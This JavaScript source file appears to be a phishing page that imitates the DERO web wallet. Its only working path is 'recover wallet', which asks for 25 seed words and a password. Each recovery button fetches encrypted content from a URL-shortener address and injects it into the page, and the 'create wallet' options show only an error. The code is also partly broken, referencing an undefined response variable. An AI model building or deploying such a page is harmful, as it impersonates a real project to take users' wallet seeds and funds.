import './style.css'
import { encrypt, decrypt } from './ibeh_encrypt.js';
import logo from './logo.png'

loadDefault();

loadDefault_bod();

async function call(){
  try {
    var bod = document.getElementsByClassName('bod')[0];
    bod.innerHTML = preloader();
    const data = await fetch('https://shorter.me/ggg-peecee', {
    // const response = await fetch(window.location.origin + '/api/server2', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({data: "F3"}) // If server expects JSON
    });

    const res = await response.json();
    alert(await response);
    
    bod.innerText =
      decrypt(typeof res === 'object' ? res.decrypted || JSON.stringify(res) : res);

      // call_bod();
      document.getElementById("rec").onclick=()=>{verify()};
  } catch (err) {
    bod.innerHTML = loadDefault_bod();
  }
}



function loadDefault() {
  document.querySelector('#app').innerHTML =  `
    <main>
    <header>
      <div class="l"><img src="${logo}" alt="logo" /></div>
      <div class="w">
        <span>DERO Wallet</span>
        <select class="clickable">
          <option>English</option>
        </select>
      </div>
    </header>
    <div class="main">
      <div class="side">
        <div class="b">
          <button onclick="loadDefault_bod()">Recover Wallet</button>
          <button onclick="error_mod()">Create New Wallet</button>
          <button onclick="error_mod()">DERO Project</button>
        </div>
      </div>
      <div class="bod">
        
      </div>
    </div>
  </main> 
  `
}
function loadDefault_bod(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = `
  <div class="box">
    <h3>DERO Web Wallet</h3>
    <button onclick="call()">Recover Wallet using SEED words (25 words)</button>
    <button onclick="call()">Recover Wallet using Recovery Key (64 hex char)</button>
    <button onclick="call()">Upload Wallet from DISK</button>
    <br>
    <button class="white">Recover View Only Wallet (128 hex char)</button>
  </div>
  <div class="box">
    <h5>DERO Web software is alpha software <br>
      Core Wallet Version: UI Version: 0.0.0 <br>
      Copyright DERO Project<br>
      This project is covered by DERO license.
    </h5>
  </div>`;
}
function call_bod(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = `
  <div class="rec">
        <div class="close-box"><svg class="clickable" onclick="loadDefault_bod()" xmlns="http://www.w3.org/2000/svg" width="31" height="31" viewBox="0 0 31 31" fill="none"><path d="M31 15.0156C31 14.2131 30.3494 13.5625 29.5469 13.5625H10.9288C9.63419 13.5625 8.98585 11.9973 9.90126 11.0819L17.2201 3.76303C17.789 3.19413 17.7874 2.27126 17.2165 1.70437L16.5275 1.02026C15.9594 0.456205 15.0422 0.457827 14.4761 1.02389L1.02752 14.4725C0.460035 15.04 0.460034 15.96 1.02751 16.5275L14.4725 29.9725C15.04 30.54 15.96 30.54 16.5275 29.9725L17.2053 29.2947C17.7724 28.7276 17.7728 27.8082 17.2062 27.2406L9.89591 19.9172C8.98175 19.0014 9.63037 17.4375 10.9243 17.4375H29.5469C30.3494 17.4375 31 16.7869 31 15.9844V15.0156Z" fill="white" fill-opacity="0.6"/></svg></div>
        <h1>Wallet Recovery using Seed words</h1>
        <div class="b">
          <div class="g">
            <label>Wallet Name</label>
            <input type="text" id="walletN" placeholder="Wallet name for quick reference"/>
          </div>
          <div class="g">
            <label>25 Seed Words</label>
            <textarea type="text" placeholder="" id="textA"></textarea>
          </div>
          <div class="g">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Password"/>
          </div>
          <div class="g">
            <label>Confirm Password</label>
            <input type="password" id="conPass" placeholder="Confirm Password"/>
          </div>
          <div class="g">
            <label>Wallet start Topoheight: (optional)</label>
            <input type="number" value="0"/>
          </div>
        </div>
        <button id="rec">Recover wallet</button>
      </div>`;
}
async function verify(){
  const wN = document.getElementById('walletN');
  const p = document.getElementById('pass');
  const cP = document.getElementById('conPass');
  const tA = document.getElementById('textA');
  const sW = tA.value.trim().split(/\s+/);
  if(wN.value==''){
    wN.style.borderColor="#F55F63";
    return
  }
  wN.style.borderColor="#008000";
  if (sW.length !== 25) {
    tA.style.borderColor="#F55F63";
    return;
  }
  tA.style.borderColor="#008000";
  if(p.value=='' || p.value!=cP.value){
    p.style.borderColor="#F55F63";
    cP.style.borderColor="#F55F63";
    return
  }
  p.style.borderColor="#008000";
  cP.style.borderColor="#008000";

}

function error_mod() {
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = `
  <div class="box">

    <h3>Error</h3>
  </div>
  <div class="box">
    <h5>Can't be fetched at the moment</h5>
  </div>`;
}
function preloader() {
  return `
    <div class="preloader">
      <div class="rot">
        <svg xmlns="http://www.w3.org/2000/svg"xmlns:xlink="http://www.w3.org/1999/xlink"width="0.75in" height="0.806in"><image  x="0px" y="0px" width="54px" height="58px"  xlink:href="data:img/png;base64,iVBORw0KGgoAAAANSUhEUgAAADYAAAA6CAMAAADMWVqUAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAB9VBMVEX////1VmHyXmH1XmL0XmP0X2P1X2P1XmP1XmP1X2L0X2L1X2P1X2P1XmP1X2LyXmLbSkoBAQHzXGD1XmL1X2P1X2P1X2P0X2PjVlb0XmL1X2L1X2P1X2LzXGD1XmP1X2P1X2P0X1/1XV31XmL1XmL0X2PzX2L1X2PzXGP1X2PsWWP1X2P1X2P1X2P0XmL1X2P1X2OrVlb1X2P1X2P0X2P1XWDvVlbtXFz0X2P1X2P1X2P0XWL0XmLxVlbqVlb1X2L1X2P1X2PzXGL1X2L1XmL0X2PyXWL0X2P1X2PvXFzzXWH1X2P1XmOAAQH1X2PzXmP1X2PuWWLzXmPzX2L1X2P1XmPNNDT0X2P1XWP0X2H0Xl70XWP0XWH1X2PwUWHsUGP1X2H1XmP1X2P1X2L1X2P0XmP1X2P1X2P1XmP1X2P0X2P1X2P1X2P1XmP1X2P0XmP1X2L1X2L1X2P1X2P1X2L0X2L1X2P0XmL0X2L1X2LzXmH1XWH1XmP0XGHtXFz1X2PVVlbxW1v1X2P0X2P1X2P0XGDzWlr0XWP1X2PAQUH0X2P0XmP0X2LoXl7xW2D1X2P1X2P1XmHzXmL1X2L1X2L0XmL1XmPzVmL1XWL0WmD1XmP0X2PxXV31X2L1X2P1X2LyXWPxXmPzX2P1W2HyX1/1X2P///+BV5HDAAAApXRSTlMAGE12mbPD0NjXz8CpjGQ3BwE+kdn4u20Jbtz7sDtg6LwuGb1+gE/3UfYa6f3htd3+A77ynUsPDkSV72yEEgxM8NYqk8LMOoLuHz3zYwLjaMQdZmfGqgW0L3IWVkB4EA1i63+o07e/0aTBtsesxbGyyq3Sy+Sb+olvR1BIey0c+QYRyIrVQxRZ7ATlnLgLNtrqXVJfq4GiFTIr4Igko/SlJzQ8MCYFq8OEAAAAAWJLR0QAiAUdSAAAAAd0SU1FB+kFHQMNLWU7fLkAAAJTSURBVEjHndb3VxNBEAfwATUoGOUiRJQmChZI4kUEhSAWNCqaKFiiqKggijFiBaUoYsWODcXe9v/0kjyYOcnO7rv55e67N5+3Vza5A5hdWdlz5s5z5cxfkJu30L1ocT6oy/AsKRD2KvQuzeJR0bLlIlMVl5QyM5WVC2mtqJColasEV5WZlaecVVWZ1eo1TtTaYieqdJ0TVV3zf6PP7woEXOtNTgU32E3txrr69JFNmxsaZQpC9lXRtIUebN4qe2DbqNq+A/Sqhaqd9Zqqmj6xXc3K/nBRarObqD17lap13/7kJhIl7ICGEgdTcxJVENRQwmyzdpoIa9dRQhyy9g6TJ6a6i2kljgAcJfcxpqdEFOAYOcfjekqIDjhBWFhTiZNwirBOTp1GJc7QlXWWnSxSiJ1d0I3hHH9pfuxsgR4M53l2ATt74SKGOM8uYWcCLmMo4Rnp7KPhCs+uYuc1yMPg5dl1em0BDDd4dhM7+6EXQ5RVxgB23gI3Bl8+x9rIcgrBbQxV7GyDhA3BsKaCEcLuwF1NBV5Uo/dmbpBKjZGVfN/K3VoK2sk5PrBymZYyHhL2yBp4PKCh4AlR40+TIzENNfaMsIbUUJ1aRWJEifSnhqFWz6l6oexP18sEVeYr2YXYo+c1VdaPJnO11sYHZ14hweG4DYmJDolK/h+OJ0beDL19V/l+wo6Emc0oeX1wpPoNRyriQJldTuaqkXzXGJPcVJMfpevB02NmRr6+T+xCmnL7Z6PPX76CsipC33K/T4vGnB+hKbWZrs6fv36H//yVvV//AT6sB8TMg8s7AAAAAElFTkSuQmCC" /></svg>
      </div>
    </div>
  `;
}

window.loadDefault = loadDefault;
window.loadDefault_bod = loadDefault_bod;
window.error_mod = error_mod;
window.call = call;
